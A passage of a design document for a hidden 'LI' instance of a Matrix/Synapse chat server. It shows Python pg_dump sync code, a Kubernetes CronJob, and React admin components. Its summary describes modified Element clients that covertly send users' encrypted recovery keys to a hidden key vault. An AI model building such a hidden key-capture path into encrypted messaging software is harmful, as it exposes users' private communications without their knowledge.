            raise RuntimeError("Sync already in progress")
        try:
            yield
        finally:
            self.release()
```

### 6.5 Main Sync Task (pg_dump/pg_restore)

**File**: `synapse-li/sync/sync_task.py`

```python
#!/usr/bin/env python3
"""
LI: Main sync task that performs full database synchronization using pg_dump/pg_restore.

This script:
1. Acquires a lock to prevent concurrent syncs
2. Performs pg_dump from main PostgreSQL database
3. Performs pg_restore to LI PostgreSQL database (full replacement)
4. Updates checkpoint after successful sync

IMPORTANT: Each sync completely overwrites the LI database with a fresh copy from main.
Any changes made in LI (such as password resets) are lost after the next sync.

Per CLAUDE.md section 3.3:
- Uses pg_dump/pg_restore for full database synchronization
- Sync interval is configurable via Kubernetes CronJob
- Manual sync trigger available from synapse-admin-li
- File lock prevents concurrent syncs
- LI uses shared MinIO for media (no media sync needed)
"""

import logging
import os
import subprocess
import sys
from datetime import datetime
from pathlib import Path

from checkpoint import SyncCheckpoint
from lock import SyncLock

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)

logger = logging.getLogger(__name__)

# Environment variables for database connections
MAIN_DB_HOST = os.environ.get('MAIN_DB_HOST', 'matrix-postgresql-rw.matrix.svc.cluster.local')
MAIN_DB_PORT = os.environ.get('MAIN_DB_PORT', '5432')
MAIN_DB_NAME = os.environ.get('MAIN_DB_NAME', 'matrix')
MAIN_DB_USER = os.environ.get('MAIN_DB_USER', 'synapse')
MAIN_DB_PASSWORD = os.environ.get('MAIN_DB_PASSWORD', '')

LI_DB_HOST = os.environ.get('LI_DB_HOST', 'matrix-postgresql-li-rw.matrix.svc.cluster.local')
LI_DB_PORT = os.environ.get('LI_DB_PORT', '5432')
LI_DB_NAME = os.environ.get('LI_DB_NAME', 'matrix_li')
LI_DB_USER = os.environ.get('LI_DB_USER', 'synapse_li')
LI_DB_PASSWORD = os.environ.get('LI_DB_PASSWORD', '')

DUMP_DIR = Path('/var/lib/synapse-li/sync')
DUMP_FILE = DUMP_DIR / 'main_db_dump.sql'


def pg_dump_main() -> bool:
    """Perform pg_dump from main PostgreSQL database."""
    logger.info(f"LI: Starting pg_dump from main database ({MAIN_DB_HOST})")

    DUMP_DIR.mkdir(parents=True, exist_ok=True)

    env = os.environ.copy()
    env['PGPASSWORD'] = MAIN_DB_PASSWORD

    cmd = [
        'pg_dump',
        '-h', MAIN_DB_HOST,
        '-p', MAIN_DB_PORT,
        '-U', MAIN_DB_USER,
        '-d', MAIN_DB_NAME,
        '--clean',
        '--if-exists',
        '--no-owner',
        '--no-privileges',
        '-f', str(DUMP_FILE)
    ]

    try:
        subprocess.run(cmd, env=env, capture_output=True, text=True,
                      check=True, timeout=3600)

        dump_size = DUMP_FILE.stat().st_size
        logger.info(f"LI: pg_dump completed ({dump_size / 1024 / 1024:.2f} MB)")
        return True

    except subprocess.TimeoutExpired:
        raise RuntimeError("pg_dump timed out")
    except subprocess.CalledProcessError as e:
        raise RuntimeError(f"pg_dump failed: {e.stderr}")


def pg_restore_li() -> bool:
    """Perform pg_restore to LI PostgreSQL database (full replacement)."""
    logger.info(f"LI: Starting pg_restore to LI database ({LI_DB_HOST})")

    env = os.environ.copy()
    env['PGPASSWORD'] = LI_DB_PASSWORD

    cmd = [
        'psql',
        '-h', LI_DB_HOST,
        '-p', LI_DB_PORT,
        '-U', LI_DB_USER,
        '-d', LI_DB_NAME,
        '-f', str(DUMP_FILE),
        '--quiet',
        '--single-transaction'
    ]

    try:
        subprocess.run(cmd, env=env, capture_output=True, text=True,
                      check=True, timeout=7200)

        logger.info("LI: pg_restore completed successfully")
        return True

    except subprocess.TimeoutExpired:
        raise RuntimeError("pg_restore timed out")
    except subprocess.CalledProcessError as e:
        if "FATAL" in (e.stderr or ""):
            raise RuntimeError(f"pg_restore failed: {e.stderr}")
        logger.warning(f"LI: pg_restore completed with warnings: {e.stderr}")
        return True


def run_sync() -> dict:
    """Execute full sync process using pg_dump/pg_restore."""
    logger.info("LI: Starting database sync task")

    lock = SyncLock()
    checkpoint_mgr = SyncCheckpoint()
    start_time = datetime.now()

    try:
        with lock.lock():
            # Step 1: pg_dump from main
            pg_dump_main()
            dump_size = DUMP_FILE.stat().st_size / 1024 / 1024

            # Step 2: pg_restore to LI
            pg_restore_li()

            # Step 3: Cleanup and update checkpoint
            DUMP_FILE.unlink(missing_ok=True)
            duration = (datetime.now() - start_time).total_seconds()
            checkpoint_mgr.update_checkpoint(dump_size, duration)

            return {'status': 'success', 'dump_size_mb': dump_size,
                    'duration_seconds': duration}

    except RuntimeError as e:
        error_msg = str(e)
        if "Sync already in progress" in error_msg:
            return {'status': 'skipped', 'reason': error_msg}
        checkpoint_mgr.mark_failed(error_msg)
        return {'status': 'failed', 'error': error_msg}


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == '--status':
        import json
        status = SyncCheckpoint().get_checkpoint()
        print(json.dumps(status, indent=2))
    else:
        result = run_sync()
        print(f"Sync result: {result['status']}")
```

**Note**: Media sync is NOT needed because LI uses the shared main MinIO bucket directly (per CLAUDE.md section 7.5).

### 6.6 Sync Trigger Methods

The sync can be triggered in multiple ways:

**1. Kubernetes CronJob (Automatic)**

```yaml
# deployment/li-instance/04-sync-system/cronjob.yaml
apiVersion: batch/v1
kind: CronJob
metadata:
  name: li-database-sync
  namespace: matrix
spec:
  schedule: "0 */6 * * *"  # Every 6 hours (configurable)
  jobTemplate:
    spec:
      template:
        spec:
          containers:
          - name: sync
            image: postgres:16-alpine
            command: ["python3", "/sync/sync_task.py"]
            envFrom:
            - secretRef:
                name: sync-system-secrets
          restartPolicy: OnFailure
```

**2. Manual Trigger from synapse-admin-li**

The admin interface includes a "Sync Now" button that executes the sync task via kubectl exec.

**3. Direct Command**

```bash
# From synapse-li pod
kubectl exec -n matrix synapse-li-0 -- python3 /sync/sync_task.py

# Check status
kubectl exec -n matrix synapse-li-0 -- python3 /sync/sync_task.py --status
```

### 6.7 synapse-admin-li Sync Button

**File**: `synapse-admin-li/src/layout/AppBar.tsx` (MODIFICATION)

```typescript
// LI: Import sync components
import { useState } from 'react';
import { IconButton, Tooltip, CircularProgress } from '@mui/material';
import SyncIcon from '@mui/icons-material/Sync';
import { useNotify } from 'react-admin';

const SyncButton = () => {
    const [syncing, setSyncing] = useState(false);
    const notify = useNotify();

    // LI: Trigger sync via backend API
    const handleSync = async () => {
        setSyncing(true);

        try {
            // Call sync API endpoint (triggers pg_dump/pg_restore)
            const response = await fetch('/api/v1/sync/trigger', {
                method: 'POST',
            });

            if (!response.ok) {
                throw new Error('Failed to trigger sync');
            }

            const data = await response.json();

            if (data.status === 'success') {
                notify(`Sync completed! Dump size: ${data.dump_size_mb?.toFixed(2)} MB`, { type: 'success' });
            } else if (data.status === 'skipped') {
                notify(`Sync skipped: ${data.reason}`, { type: 'warning' });
            } else {
                notify(`Sync failed: ${data.error}`, { type: 'error' });
            }
        } catch (error) {
            notify('Sync request failed', { type: 'error' });
        } finally {
            setSyncing(false);
        }
    };

    return (
        <Tooltip title={syncing ? "Syncing in progress..." : "Sync database from main instance"}>
            <span>
                <IconButton
                    color="inherit"
                    onClick={handleSync}
                    disabled={syncing}
                >
                    {syncing ? <CircularProgress size={24} color="inherit" /> : <SyncIcon />}
                </IconButton>
            </span>
        </Tooltip>
    );
};

// LI: Add SyncButton to AppBar
// In AppBar component's return statement, add:
// <SyncButton />  // Place next to logout/theme/refresh buttons
```

### 6.8 Sync Status Display

**File**: `synapse-admin-li/src/components/SyncStatus.tsx` (NEW FILE)

```typescript
/**
 * LI: Sync Status Component
 *
 * Displays last sync information from checkpoint file.
 */

import { Card, CardContent, Typography, Box, Chip } from '@mui/material';
import { useState, useEffect } from 'react';

interface SyncCheckpoint {
    last_sync_at: string | null;
    last_sync_status: string;
    last_dump_size_mb: number | null;
    last_duration_seconds: number | null;
    total_syncs: number;
    failed_syncs: number;
}

export const SyncStatus = () => {
    const [checkpoint, setCheckpoint] = useState<SyncCheckpoint | null>(null);

    useEffect(() => {
        // Fetch sync status on mount
        fetch('/api/v1/sync/status')
            .then(res => res.json())
            .then(setCheckpoint)
            .catch(console.error);
    }, []);

    if (!checkpoint) return null;

    return (
        <Card>
            <CardContent>
                <Typography variant="h6" gutterBottom>
                    Database Sync Status
                </Typography>

                <Box display="flex" gap={1} mb={2}>
                    <Chip
                        label={checkpoint.last_sync_status}
                        color={checkpoint.last_sync_status === 'success' ? 'success' : 'error'}
                    />
                </Box>

                {checkpoint.last_sync_at && (
                    <Typography variant="body2">
                        Last sync: {new Date(checkpoint.last_sync_at).toLocaleString()}
                    </Typography>
                )}

                {checkpoint.last_dump_size_mb && (
                    <Typography variant="body2">
                        Dump size: {checkpoint.last_dump_size_mb.toFixed(2)} MB
                    </Typography>
                )}

                {checkpoint.last_duration_seconds && (
                    <Typography variant="body2">
                        Duration: {checkpoint.last_duration_seconds.toFixed(1)} seconds
                    </Typography>
                )}

                <Typography variant="body2" color="textSecondary" mt={1}>
                    Total syncs: {checkpoint.total_syncs} | Failed: {checkpoint.failed_syncs}
                </Typography>
            </CardContent>
        </Card>
    );
};
```

**Note**: Sync frequency is configured via Kubernetes CronJob schedule, not via UI. Edit the CronJob spec to change the interval.

---

## Summary

### Project Structure
- **Main Instance**: synapse, element-web, element-x-android, synapse-admin
- **Hidden Instance**: synapse-li, element-web-li, synapse-admin-li, key_vault

### Key Components Implemented

1. **key_vault (Django)**: In hidden instance network, stores encrypted recovery keys with deduplication
2. **RSA Encryption**: Hardcoded public key in both element-web and element-x-android
3. **Synapse Proxy**: Validates tokens, forwards to key_vault (only main synapse can access hidden instance)
4. **Client Changes**: Both element-web & element-x-android send encrypted recovery keys ONLY on successful operations with 5-retry logic
5. **Sync System**: pg_dump/pg_restore based with file-based locking/checkpoints, full database replacement, on-demand + CronJob scheduled

### Sync System Details (Per CLAUDE.md)
- **Database**: pg_dump/pg_restore for full synchronization (each sync completely overwrites LI database)
- **Media**: LI uses shared main MinIO directly (no media sync needed)
- **Trigger**: Manual via synapse-admin-li "Sync Now" button or automatic via Kubernetes CronJob
- **Lock**: File-based fcntl lock prevents concurrent syncs
- **Checkpoint**: JSON file tracks sync status, dump size, duration, success/failure counts

### Minimal Code Changes
- New files for core logic (LIKeyCapture.ts, LIKeyCapture.kt, li_proxy.py, sync_task.py, etc.)
- Existing files modified with `// LI:` or `# LI:` comments for easy tracking
- Clean separation for upstream compatibility
- No Synapse database schema changes (file-based sync tracking)

### Logging
- All LI operations logged with `LI:` prefix
- Audit trail for key storage requests
- Sync status and errors logged

### Network Security
- key_vault in hidden instance network
- Only main Synapse can access key_vault
- Network isolation is organization's responsibility (per CLAUDE.md 7.4)

### Next Steps
See [Part 2: Soft Delete & Deleted Messages](LI_REQUIREMENTS_ANALYSIS_02_SOFT_DELETE.md)
